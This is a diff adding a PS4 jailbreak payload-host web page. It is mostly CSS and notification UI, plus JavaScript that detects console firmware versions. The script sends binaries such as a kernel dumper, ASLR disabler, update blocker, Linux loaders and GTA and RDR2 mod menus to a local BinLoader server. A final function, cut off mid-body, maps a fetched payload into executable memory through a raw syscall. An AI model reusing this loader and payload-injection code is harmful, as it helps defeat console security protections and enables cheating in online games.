@@ -1,0 +1,2639 @@
+<style>
+@import url('https://fonts.googleapis.com/css?family=Raleway:300,400');
+
+/* Progress Bar */
+
+#myProgress {
+  width: 50%;
+  background-color: grey;
+  margin-left: auto;
+  margin-right: auto;
+  margin-top: 5%;
+  border-radius: 15px;
+}
+  
+#myBar {
+  width: 1%;
+  height: 30px;
+  background-color: rgb(84, 0, 163);
+  border-radius: 15px;
+}
+
+/* Button Styles */
+#ButtonJB {
+  background-color: rgba(81, 0, 187, 0.666);
+  text-align: center;
+  font-size: 250%;
+  width: 300px;
+  margin-top: 3%;
+  padding: 1%;
+  margin-left: auto;
+  margin-right: auto;
+  justify-content: center;
+  border-radius: 100%;
+  border-width: medium;
+  border-color: purple;
+  transition: 1.5s;
+  box-shadow: black;
+  cursor: pointer;
+  shape-outside: padding-box;
+  text-decoration: none;
+}
+
+#ButtonJB:hover {
+  background-color: rgba(234, 0, 255, 0.666);
+  text-decoration: none;
+}
+
+#Jailbreak {
+  background-color: rgba(133, 0, 241, 0.666);
+  width: 90%;
+  margin-top: 6%;
+  margin-bottom: 6%;
+  margin-left: auto;
+  margin-right: auto;
+  justify-content: center;
+  padding-top: 95px;
+  padding-bottom: 95px;
+  border-radius: 50%;
+  transition: 2.5s;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  font-family: 'Franklin Gothic Medium', serif;
+  overflow: hidden;
+  text-decoration: none;
+}
+
+#Jailbreak:hover {
+  background-color: rgba(255, 0, 191, 0.666);
+  text-decoration: none;    
+  color: #2D3142;
+}
+*
+#Jailbreak:hover a {  
+  color: #2D3142;
+}
+
+#jailbreak:active {
+  background-color: rgba(108, 0, 250, 0.666);
+  color: #2D3142;
+}
+.button {
+  display: inline-flex;
+  height: 40px;
+  width: 200px;
+  border: 5px solid #BFC0C0;
+  margin: 12px 30px 20px 25px;
+  color: #BFC0C0;
+  text-transform: uppercase;
+  text-decoration: none;
+  font-size: .8em;
+  letter-spacing: 1.5px;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+}
+
+#button-Payload {
+  position: relative;
+  overflow: hidden;
+  cursor: pointer;
+}
+
+#button-Payload a {
+  color: #BFC0C0;
+  text-decoration: none;
+  letter-spacing: 1px;
+  position: relative;
+  transition: all .45s ease-Out;
+}
+
+#circle {
+  width: 0%;
+  height: 0%;
+  opacity: 0;
+  line-height: 40px;
+  border-radius: 50%;
+  background: #BFC0C0;
+  position: absolute;
+  transition: all .5s ease-Out;
+  top: 20px;
+  left: 70px;
+}
+
+#button-Payload:hover #circle {
+  width: 200%;
+  height: 500%;
+  opacity: 1;
+  top: -70px;
+  left: -70px;
+}
+
+#button-Payload:hover a {
+  color: #2D3142;
+  text-decoration: underline;
+  text-decoration-color: #2D3142;
+}
+
+
+.Title {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  font-size: x-large;
+  text-align: center;
+  margin-top: 15px;
+}
+
+body  {
+  background: linear-gradient(270deg, rgb(56, 0, 102), #b300f5);
+  background-size: 400% 400%;
+
+  -webkit-animation: BackgroundAnimate 30s ease infinite;
+  -moz-animation: BackgroundAnimate 15s ease infinite;
+  animation: BackgroundAnimate 15s ease infinite;
+}
+
+.Title h1{
+  color: white;
+  font-family: 'Franklin Gothic Medium', serif;
+  letter-spacing: 5px;
+  text-shadow: 0 0 5px #ea00ff, 0 0 10px #7700ff;
+}
+
+.Textbox {
+  width: 100%;
+}
+
+#psip {
+  text-align: center;
+  margin-left: 38%;
+  margin-right: auto;
+  width:15%;
+  display:flex;
+  position: absolute;
+  
+  background: rgba(0, 0, 0, 0.500);
+  border-radius: 2em;
+  border: none;
+  padding: 0.8em;
+  
+  color: #ffffff;
+  padding-left: 1.5em;
+  
+  outline: none;
+  box-shadow: 0 4px 6px -5px hsl(0, 0%, 40%), inset 0px 4px 6px -5px hsl(0, 0%, 2%);
+  backdrop-filter: blur(5px);
+}
+  
+@-webkit-keyframes rotating {
+    from {
+      transform: rotate(0deg);
+    }
+    to {
+      transform: rotate(360deg);
+    }
+}
+  
+@keyframes rotating {
+    from {
+      transform: rotate(0deg);
+    }
+    to {
+      transform: rotate(360deg);
+    }
+}
+
+@-webkit-keyframes BackgroundAnimate {
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+}
+@-moz-keyframes BackgroundAnimate {
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+}
+@keyframes BackgroundAnimate {
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+}
+
+.topmenu {
+  overflow: hidden;
+  background-color: rgba(51, 51, 51, 0.700);
+  border-radius: 15px;
+  font-family: 'Franklin Gothic Medium', serif;
+  display: flex;
+  justify-content: center;
+  margin: auto;
+  width: 25%;
+  margin-top: 6%;
+  margin-bottom: 0%;
+  backdrop-filter: blur(5px);
+}
+  
+
+.topmenu a {
+  float: left;
+  display: block;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 15px;
+}
+
+.topmenu a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+.topmenu a.active {
+  background-color: #5a04aa;
+  color: white;
+}
+
+.topmenu .icon {
+  display: none;
+}
+
+.payloadslist {
+  justify-content: center;
+  margin-top: 1%;
+  margin-left: auto;
+  margin-right: auto;
+  width: 70%;
+  background-color: rgba(0, 0, 0, 0.700);
+  padding: 2%;
+  padding-top: 0%;
+  padding-bottom: 1%;
+  border-radius: 15px;
+  overflow-x: hidden;
+  overflow-y: auto;
+  height: 42%;
+  text-align: center;
+  backdrop-filter: blur(5px);
+}
+
+.payloadslist h1 {
+  color: white;
+  font-family: Impact, Haettenschweiler, Franklin Gothic Bold, Charcoal, Helvetica Inserat, Bitstream Vera Sans Bold, Arial Black, sans serif;
+  text-transform: uppercase;
+  text-shadow: 0 0 5px #ea00ff, 0 0 10px #7700ff;
+  letter-spacing: 1.5px;
+  border-bottom: white;
+  border: thin;
+  text-decoration: underline;
+  text-decoration-line: underline;
+  text-decoration-style: inherit;
+  font-weight:bold;
+}
+
+.ComboBox {
+  text-align: center;
+  margin-left: 55%;
+  margin-right: auto;
+  margin-top: 2%;
+  width:6.5%;
+  display:block;
+  
+  background: rgba(0, 0, 0, 0.445);
+  border-radius: 2em;
+  border: none;
+  padding: 0.8em;
+  
+  color: #ffffff;
+  padding-left: 1.5em;
+  
+  outline: none;
+  box-shadow: 0 4px 6px -5px hsl(0, 0%, 40%), inset 0px 4px 6px -5px hsl(0, 0%, 2%);
+  backdrop-filter: blur(5px);
+}
+
+.BC {
+  --border-width: 5px;
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 25%;
+  height: 3%;
+  font-family: Lato, sans-serif;
+  text-transform: uppercase;
+  color: white;
+  background: rgb(125, 0, 150);
+  border-radius: var(--border-width);
+  transition: 1s;
+  font-size: 12px;
+  margin-left: 37%;
+  margin-bottom: 5%;
+}
+
+.BC a {
+  text-decoration: none;
+  color: white;
+  margin-top: 3%;
+  margin-bottom: 3%;
+  justify-content: center;
+  text-align: center;
+  align-content: center;
+  display: flex;
+}
+.BC::after {
+  position: absolute;
+  content: "";
+  top: calc(-1 * var(--border-width));
+  left: calc(-1 * var(--border-width));
+  z-index: -1;
+  width: calc(100% + var(--border-width) * 2);
+  height: calc(100% + var(--border-width) * 2);
+  background: linear-gradient(60deg, #5f86f2, #a65ff2, #f25fd0, #f25f61, #5f86f2, #a65ff2, #f25fd0);
+  background-size: 300% 300%;
+  background-position: 0 50%;
+  border-radius: calc(2 * var(--border-width));
+}
+
+.BC:hover {
+  background: rgb(70, 0, 150);
+}
+
+.BJ {
+  --border-width: 5px;
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  width: 10%;
+  height: 3%;
+  font-family: Lato, sans-serif;
+  text-transform: uppercase;
+  color: white;
+  background: rgb(125, 0, 150);
+  border-radius: var(--border-width);
+  transition: 1s;
+  font-size: 12px;
+  margin-left: 59%;
+}
+
+.BJ a {
+  text-decoration: none;
+  color: white;
+  margin-top: 3%;
+  margin-bottom: 3%;
+  justify-content: center;
+  text-align: center;
+  align-content: center;
+  display: flex;
+}
+
+.BJ::after {
+  position: absolute;
+  content: "";
+  top: calc(-1 * var(--border-width));
+  left: calc(-1 * var(--border-width));
+  z-index: -1;
+  width: calc(100% + var(--border-width) * 2);
+  height: calc(100% + var(--border-width) * 2);
+  background: linear-gradient(60deg, #5f86f2, #a65ff2, #f25fd0, #f25f61, #5f86f2, #a65ff2, #f25fd0);
+  background-size: 300% 300%;
+  background-position: 0 50%;
+  border-radius: calc(2 * var(--border-width));
+}
+
+.BJ:hover {
+  background: rgb(70, 0, 150);
+}
+
+.BP {
+  --border-width: 3px;
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 29.5%;
+  height: auto;
+  font-family: Lato, sans-serif;
+  text-transform: uppercase;
+  color: white;
+  background: rgb(125, 0, 150);
+  border-radius: var(--border-width);
+  transition: 1s;
+  font-size: large;
+  bottom: 15%;
+  text-align: center;
+  margin-left: 35%;
+}
+
+.BP a {
+  text-decoration: none;
+  color: white;
+  margin-top: 3%;
+  margin-bottom: 3%;
+  justify-content: center;
+  text-align: center;
+  align-content: center;
+  display: flex;
+}
+.BP::after {
+  position: absolute;
+  content: "";
+  top: calc(-1 * var(--border-width));
+  left: calc(-1 * var(--border-width));
+  z-index: -1;
+  width: calc(100% + var(--border-width) * 2);
+  height: calc(100% + var(--border-width) * 2);
+  background: linear-gradient(60deg, #5f86f2, #a65ff2, #f25fd0, #f25f61, #5f86f2, #a65ff2, #f25fd0);
+  background-size: 300% 300%;
+  background-position: 0 50%;
+  border-radius: calc(2 * var(--border-width));
+}
+
+.BP:hover {
+  background: rgb(70, 0, 150);
+
+}
+
+.BCA {
+  --border-width: 3px;
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 29.5%;
+  height: auto;
+  font-family: Lato, sans-serif;
+  text-transform: uppercase;
+  color: white;
+  background: rgb(125, 0, 150);
+  border-radius: var(--border-width);
+  transition: 1s;
+  font-size: large;
+  bottom: 5%;
+  text-align: center;
+  margin-left: 35%;
+}
+
+.BCA a {
+  text-decoration: none;
+  color: white;
+  margin-top: 3%;
+  margin-bottom: 3%;
+  justify-content: center;
+  text-align: center;
+  align-content: center;
+  display: flex;
+}
+.BCA::after {
+  position: absolute;
+  content: "";
+  top: calc(-1 * var(--border-width));
+  left: calc(-1 * var(--border-width));
+  z-index: -1;
+  width: calc(100% + var(--border-width) * 2);
+  height: calc(100% + var(--border-width) * 2);
+  background: linear-gradient(60deg, #5f86f2, #a65ff2, #f25fd0, #f25f61, #5f86f2, #a65ff2, #f25fd0);
+  background-size: 300% 300%;
+  background-position: 0 50%;
+  border-radius: calc(2 * var(--border-width));
+}
+
+.BCA:hover {
+  background: rgb(70, 0, 150);
+
+}
+
+.BH {
+  --border-width: 5px;
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 15%;
+  height: 3%;
+  font-family: Lato, sans-serif;
+  text-transform: uppercase;
+  color: white;
+  background: rgb(125, 0, 150);
+  border-radius: var(--border-width);
+  transition: 1s;
+  font-size: 15px;
+  top: 5%;
+  margin-left: 2%;
+}
+
+.BH a {
+  text-decoration: none;
+  color: white;
+  margin-top: 3%;
+  margin-bottom: 3%;
+  justify-content: center;
+  text-align: center;
+  align-content: center;
+  display: flex;
+}
+
+.BH::after {
+  position: absolute;
+  content: "";
+  top: calc(-1 * var(--border-width));
+  left: calc(-1 * var(--border-width));
+  z-index: -1;
+  width: calc(100% + var(--border-width) * 2);
+  height: calc(100% + var(--border-width) * 2);
+  background: linear-gradient(60deg, #5f86f2, #a65ff2, #f25fd0, #f25f61, #5f86f2, #a65ff2, #f25fd0);
+  background-size: 300% 300%;
+  background-position: 0 50%;
+  border-radius: calc(2 * var(--border-width));
+}
+
+.BH:hover {
+  background: rgb(70, 0, 150);
+}
+
+
+.Credit {
+  background-color: rgba(0, 0, 0, 0.700);
+  border-radius: 10px;
+  justify-content: center;
+  margin-top: 1%;
+  margin-left: 30%;
+  margin-right: auto;
+  width: 40%;
+  text-align: center;
+  padding-bottom: 15px;
+  position: absolute;
+  bottom: 35%;
+  backdrop-filter: blur(5px);
+}
+
+.Credit .TitleCredit {
+  font-family: 'Franklin Gothic Medium', serif;
+  letter-spacing: 5px;
+  text-shadow: 0 0 5px #ea00ff, 0 0 10px #7700ff;
+  color: white;
+  margin-top: 1%;
+  margin-bottom: 2%;
+}
+
+.Credit #Categorie {
+  color: rgb(225, 0, 255);
+  margin-top: 2%;
+}
+
+.Credit #Name {
+  color: white;
+  margin-top: 2%;
+}
+
+.Credit #Link {
+  color: rgb(0, 162, 255);
+  margin-top: 2%;
+  text-decoration: none;
+}
+
+.Credit #CB {
+  background-color: red;
+  width: 5%;
+  border-radius: 5px;
+  font-family: 'Franklin Gothic Medium', serif;
+  font-size: large;
+  text-align: center;
+  position:absolute;
+  justify-content: left;
+  margin-right: auto;
+  margin-left: 94%;
+  margin-top: 1%;
+}
+
+.BG {
+  position: absolute;
+  z-index: -99;
+  border-radius: 15px;
+  width: 98%;
+  height: 98%;
+  opacity: 80%;
+  filter: alpha(opacity=50);
+  margin-left: 0.5%;
+  bottom: 1%;
+}
+
+
+ .switch {
+  position: absolute;
+  width: 60px;
+  height: 34px;
+  left: 42%;
+}
+
+.PS4 h2 {
+  position: relative;
+  color: #ddd;
+  left: 47%;
+  font-size: 24px;
+  text-shadow: 0 0 5px #ea00ff, 0 0 10px #7700ff;
+}
+
+
+@media screen and (max-width: 1200px){
+  body {
+    background-color: #2D3142;
+  }
+
+  .BG {
+    visibility: hidden;
+  }
+
+  .Title h1 {
+    top: 1%;
+    left: 1%;
+    font-size: 500%;
+  }
+
+  .BC {
+    visibility: hidden;
+  }
+
+  .BH {
+    visibility: hidden;
+  }
+
+  .payloadslist {
+    width: 95%;
+    margin-top: 10%;
+    font-size: 100%;
+    height: 60%;
+    margin-bottom: 5%;
+  }
+
+  .payloadslist h1 {
+    font-size: 500%;
+  }
+
+  .payloadslist div {
+    width: 92%;
+    font-size: 300%;
+    height: 20%;
+  }
+
+  .payloadslist a {
+    bottom: 3%;
+    top: 3%;
+  }
+
+  .topmenu {
+    width: 60%;
+  }
+
+  .topmenu a {
+    font-size: 250%;
+  }
+
+  #psip {
+    width: 50%;
+    height: 5%;
+    left: -35%;
+    font-size: 200%;
+  }
+
+  #cb {
+    font-size: 120%;
+    width: 30%;
+  }
+}
+</style>
+
+<script>
+var i = 0;
+
+var fwUA = navigator.userAgent.substring(navigator.userAgent.indexOf('5.0 (') + 19, navigator.userAgent.indexOf(') Apple'));
+var fwC = navigator.userAgent;
+var FwUAR = fwUA.replace("layStation%204/index.html","");
+
+function Menu() {
+    var x = document.getElementById("Menu");
+    if (x.className === "topmenu") {
+      x.className += " responsive";
+    } else {
+      x.className = "topmenu";
+    }
+}
+
+function ConsoleCheck() {
+   var images;
+    let currentDate = new Date();
+    let cMonth = currentDate.getMonth() +1;
+
+    if(cMonth == "12") {
+      images = [
+        'Christmas/BG.jpg',
+      ]
+    }else if (cMonth == "10"){
+      images = [
+        'Halloween/BG.jpg',
+      ]
+    }else{
+      images = [
+        'BG.jpg',
+        'BG1.html',
+        'BG3.html',
+        'BG4.html',
+        'BG7.html',
+        'BG8.html',
+        'BG9.html',
+        'BG10.html',
+        "BG11.html",
+        "BG12.html",
+        "BG13.html",
+        "BG15.html",
+        "BG16.html",
+        "BG17.html",
+        "BG18.html",
+        "BG19.html",
+        "BG20.html"
+      ]
+    }
+    
+    var length = images.length;
+    var rand = Math.floor(length*Math.random());
+    document.getElementById('BG').src="HakkuraifuBG.jpg";
+    //document.getElementById('BG').src="CSS/Images" + images[rand];
+
+    let PS4C = navigator.userAgent.substring(navigator.userAgent.indexOf('5.0 ('), navigator.userAgent.indexOf(') Apple'));
+    //alert(PS4C);
+    if (PS4C.includes("5.0 (Play") ) {
+    //alert("ps4 detect");
+    document.getElementById("pc").style.display = "none";
+    document.getElementById("ps4").style.display = "block";
+    document.getElementById("ButtonCredit").style.display = "none";
+    document.getElementById("ButtonJailbreak").style.display = "none";
+
+
+    const params = new URLSearchParams(document.location.search);
+    const J = params.get("J");
+    if (J == "P") {
+      document.getElementById("pc").style.display = "block";
+      document.getElementById("ps4").style.display = "none";
+      document.getElementById("psip").style.visibility = "hidden";
+      document.getElementById("psip").value = "127.0.0.1";
+      document.getElementById("cb").style.visibility = "hidden";
+      removeOptions(document.getElementById("cb"));
+      addOption(document.getElementById("cb"), fwUA, fwUA);
+      //alert(fwUA);
+      //document.getElementById("cb").value = fwUA;
+      document.getElementById("ButtonCredit").style.display = "block";
+      document.getElementById("ButtonCredit").style.width = "10%";
+      document.getElementById("ButtonCredit").style.marginLeft = "30%";
+      document.getElementById("ButtonJailbreak").style.display = "block";
+
+      if (fwC.includes("5.05") || fwC.includes("6.72") || fwC.includes("7.50") || fwC.includes("7.51") || fwC.includes("7.55") || fwC.includes("9.00")) {
+        OSDetect(`OS : Playstation 4 <br> FW : ${FwUAR}`, "success");
+      } else if (fwUA == "5.50" || fwUA == "5.53" || fwUA == "5.55" || fwUA == "5.56" || fwUA == "6.00" || fwUA == "6.02" || fwUA == "6.20" || fwUA == "6.50" || fwUA == "6.51" || fwUA == "6.70" || fwUA == "6.71") {
+        OSDetect(`OS : Playstation 4 <br> FW : ${fwUA}<br> Please update to 6.72 !`, "warning");
+      } else if (fwUA == "7.00" || fwUA == "7.01" || fwUA == "7.02") {
+        OSDetect(`OS : Playstation 4 <br> FW : ${fwUA} <br> Please update to 7.55 !`, "warning");
+      } else if (fwUA == "8.00" || fwUA == "8.01" || fwUA == "8.03" || fwUA == "8.50" || fwUA == "8.52") {
+        OSDetect(`OS : Playstation 4 <br> FW : ${fwUA}<br> Please update to 9.00 !`, "warning");
+      } else {
+        OSDetect(`OS : Playstation 4 <br> FW : N/A <br> Can't detect firmware !`, "warning");
+      } 
+    } 
+  } else {
+    document.getElementById("pc").style.display = "block";
+    document.getElementById("ButtonCredit").style.width = "25%";
+    document.getElementById("ButtonCredit").style.marginLeft = "37%";
+    
+    if (PS4C.includes("Windows")) {
+      OSDetect(`OS : Windows`, "success");
+    } else if (PS4C.includes("(iPhone;")) {
+      OSDetect(`OS : iPhone`, "success");
+    } else if (PS4C.includes("Android")) {
+      OSDetect(`OS : Android`, "success");
+    } else if (PS4C.includes("iPad")) {
+      OSDetect(`OS : iPad`, "success");
+    } else if (PS4C.includes("Mac OS")) {
+      OSDetect(`OS : MacOS`, "success");
+    } else if (PS4C.includes("Linux")) {
+      OSDetect(`OS : Linux`, "success");
+    } else {
+      OSDetect(`OS : N/A <br> Can't detect OS`, "warning");
+    }
+  }
+}
+
+function addOption(selectbox,text,value )  {
+  var optn = document.createElement("OPTION");
+  optn.text = text;
+  optn.value = value;
+  selectbox.options.add(optn);
+}
+
+function removeOptions(selectElement) {
+  var i, L = selectElement.options.length - 1;
+  for(i = L; i >= 0; i--) {
+     selectElement.remove(i);
+  }
+}
+
+
+//------BIG THANKS TO SISTRO FOR THIS !!!!!--------
+
+
+var getPayload = function(payload, onLoadEndCallback) {
+  var req = new XMLHttpRequest();
+  req.open('GET.html', payload);
+  req.send();
+  req.responseType = "arraybuffer";
+  req.onload = function (event) {
+      if (onLoadEndCallback) onLoadEndCallback(req, event);
+  };
+}
+
+var sendPayload = function(url, data, onLoadEndCallback) {
+  var req = new XMLHttpRequest();
+  req.open("POST.html", url, true);
+  req.send(data);
+
+  req.onload = function (event) {
+      if (onLoadEndCallback) onLoadEndCallback(req, event);
+  };
+}
+
+function LoadpaylodsGhen20(PLfile){ //Loading Payload via Payload Param.
+	  var PS4IP = document.getElementById("psip").value;
+	  
+		// First do an initial check to see if the BinLoader server is running, ready or busy.
+		var req = new XMLHttpRequest();
+    if (PS4IP == "127.0.0.1") {
+      req.open("POST.html", `http://${PS4IP}:9090/status`);
+    } else {
+      req.open("GET.html", `http://${PS4IP}:9090/status`);
+    }
+		req.send();
+		req.onerror = function(){
+			//alert("Cannot Load Payload Because The BinLoader Server Is Not Running");//<<If server is not running, alert message.
+      ServerStatus("Cannot Load Payload Because The BinLoader Server Is Not Running");
+			return;
+		};
+		req.onload = function(){
+			var responseJson = JSON.parse(req.responseText);
+			if (responseJson.status=="ready"){
+		  getPayload(PLfile, function (req) {
+				if ((req.status === 200 || req.status === 304) && req.response) {
+				   //Sending bins via IP POST Method
+           sendPayload(`http://${PS4IP}:9090`, req.response, function (req) {
+            if (req.status === 200) {
+              alert("Payload sent !");
+					   }else{
+               ErrorNotif();
+               return;
+              }
+					})
+				}
+			});
+      PleaseWait();
+			}
+			else {
+				//alert("Cannot Load Payload Because The BinLoader Server Is Busy");//<<If server is busy, alert message.
+        ErrorNotif3();
+				return;
+		  }
+	  };
+  }
+
+//--------------------------------------------------
+
+function fade(element) {
+  var op = 1;  // initial opacity
+  var timer = setInterval(function () {
+      if (op <= 0.1){
+          clearInterval(timer);
+          document.getElementById(element).style.display = 'none';
+      }
+      document.getElementById(element).style.opacity = op;
+      document.getElementById(element).style.filter = 'alpha(opacity=' + op * 100 + ")";
+      op -= op * 1;
+  }, 0);
+}
+
+function unfade(element) {
+  var op = 0.1;  // initial opacity
+  document.getElementById(element).style.display = 'block';
+  var timer = setInterval(function () {
+      if (op >= 1){
+          clearInterval(timer);
+      }
+      document.getElementById(element).style.opacity = op;
+      document.getElementById(element).style.filter = 'alpha(opacity=' + op * 100 + ")";
+      op += op * 1;
+  }, 0);
+}
+
+function SucessNotif() {
+  new Notify({
+    status: 'success',
+    title: 'Sucess',
+    text: "Payload Loaded !",
+    effect: 'slide',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: false,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 500,
+    gap: 25,
+    distance: 35,
+    type: 2,
+    position: 'top right'
+  })
+}
+
+function ErrorNotif() {
+  new Notify({
+    status: 'Error',
+    title: 'Error',
+    text: "Can't send the payload !",
+    effect: 'slide',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: false,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 500,
+    gap: 25,
+    distance: 35,
+    type: 3,
+    position: 'top right'
+  })
+}
+
+function ErrorNotif2() {
+  new Notify({
+    status: 'Error',
+    title: 'Error',
+    text: "Payload Not Found !",
+    effect: 'slide',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: true,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 500,
+    gap: 25,
+    distance: 35,
+    type: 3,
+    position: 'top right'
+  })
+}
+
+function ErrorNotif3() {
+  new Notify({
+    status: 'Error',
+    title: 'Error',
+    text: "Server busy !",
+    effect: 'slide',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: true,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 500,
+    gap: 25,
+    distance: 35,
+    type: 3,
+    position: 'top right'
+  })
+}
+
+function PleaseWait() {
+  new Notify({
+    status: 'warning',
+    title: 'PLEASE WAIT',
+    text: "If nothing happend check if you have activated the 'BinLoader Server' in the setting !",
+    effect: 'fade',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: false,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 1000,
+    gap: 25,
+    distance: 35,
+    type: 2,
+    position: 'top right'
+  })
+}
+
+function ServerStatus(str) {
+  new Notify({
+    status: 'warning',
+    title: 'Server Status',
+    text: str,
+    effect: 'fade',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: false,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout: 1000,
+    gap: 25,
+    distance: 35,
+    type: 2,
+    position: 'top right'
+  })
+}
+
+
+function OSDetect(str,tpe) {
+  new Notify({
+    status: tpe,
+    title: "Operating System Detected",
+    text: str,
+    effect: 'slide',
+    speed: 300,
+    customClass: null,
+    customIcon: null,
+    showIcon: false,
+    showCloseButton: false,
+    autoclose: true,
+    autotimeout : 10000,
+    gap: 25,
+    distance: 35,
+    type: 1,
+    position: 'top right'
+  })
+}
+
+// Payloads
+
+// Dumpers
+
+function load_AppDumper(){
+    PLfile = "./payloads/pl_appdumper.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_KernelDumper(){
+    PLfile = "./payloads/pl_kerneldumper.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_VTXDumper(){
+        PLfile = "./payloads/dumpervtx.bin";
+        LoadpaylodsGhen20(PLfile);
+}
+
+
+// Tools
+
+function load_PS4Debug(){
+    PLfile = "./payloads/pl_ps4debug.bin";
+    Pay = PLfile;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_App2USB(){
+    PLfile = "./payloads/pl_app2usb.bin";
+    Pay = PLfile;
+    LoadpaylodsGhen20(PLfile);
+}
+
+
+function load_BackupDB(){
+    PLfile = "./payloads/pl_backup.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_RestoreDB(){
+    PLfile = "./payloads/pl_restore.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_DisableASLR(){
+    PLfile = "./payloads/pl_disableaslr.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_DisableUpdates(){
+    PLfile = "./payloads/pl_disableupdates.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_EnableUpdates(){
+    PLfile = "./payloads/pl_enbaleupdates.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_ExitIDU(){
+    PLfile = "./payloads/pl_exitidu.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+  
+function load_FTP(){
+    PLfile = "./payloads/pl_ftp.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+  
+function load_HistoryBlocker(){
+    PLfile = "./payloads/pl_historyblocker.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+  
+function load_RIFRenamer(){
+    PLfile = "./payloads/pl_rifrenamer.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+  
+function load_Orbis(){
+    PLfile = "./payloads/pl_OrbisToolbox.bin";
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_WebrRTE(){
+    PLfile = `./payloads/pl_webrte.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_ToDex(){
+    PLfile = `./payloads/pl_todex.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+
+// Linux
+
+function load_Linux(){
+    PLfile = `./payloads/LinuxLoader.bin`;
+    LoadpaylodsGhen20(PLfile);
+
+}
+
+function load_Linux2gb(){
+    PLfile = `./payloads/LinuxLoader2gb.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Linux3gb(){
+    PLfile = `./payloads/LinuxLoader3gb.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Linux4gb(){
+    PLfile = `./payloads/LinuxLoader4gb.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Linux5gb(){
+    PLfile = `./payloads/LinuxLoader5gb.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Linux_720p(){
+    PLfile = `./payloads/LinuxLoader720.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Linux2gb_720p(){
+    PLfile = `./payloads/LinuxL7202gb.bin`;
+    LoadpaylodsGhen20(PLfile);
+
+
+}
+
+function load_Linux3gb_720p(){
+    PLfile = `./payloads/LinuxL7203gb.bin`;
+    LoadpaylodsGhen20(PLfile);  
+}
+
+function load_Linux4gb_720p(){
+    PLfile = `./payloads/LinuxL7204gb.bin`;
+    LoadpaylodsGhen20(PLfile);  
+}
+
+function load_Linux5gb_720p(){
+    PLfile = `./payloads/LinuxL7205gb.bin`;
+    LoadpaylodsGhen20(PLfile);  
+}
+
+// Mod Menu
+
+// GTA
+
+function load_GTAArbic(){
+        PLfile = `./payloads/pl_ArabicGuy127.bin`;
+        LoadpaylodsGhen20(PLfile);
+}
+
+function load_GTAArbic3(){
+        PLfile = `./payloads/pl_ArabicGuy132.bin`;
+        LoadpaylodsGhen20(PLfile);
+}
+
+function load_GTAArbic33(){
+    PLfile = `./payloads/pl_ArabicGuy133.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_GTAWM(){
+    PLfile = `./payloads/pl_WildeModz_138.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_GTABQ(){
+    PLfile = `./payloads/pl_BeefQueefMod138.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+// RDR2
+
+function load_Oysters100(){
+    PLfile = `./payloads/pl_rdr2100.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+
+function load_Oysters113(){
+    PLfile = `./payloads/pl_rdr2113.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Oysters119(){
+    PLfile = `./payloads/pl_rdr2119.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+
+function load_Oysters124(){
+    PLfile = `./payloads/pl_rdr2124.bin`;
+    LoadpaylodsGhen20(PLfile);
+}
+	
+function load_poc(){
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET.html', PLfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   PLD = req.response;
+   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
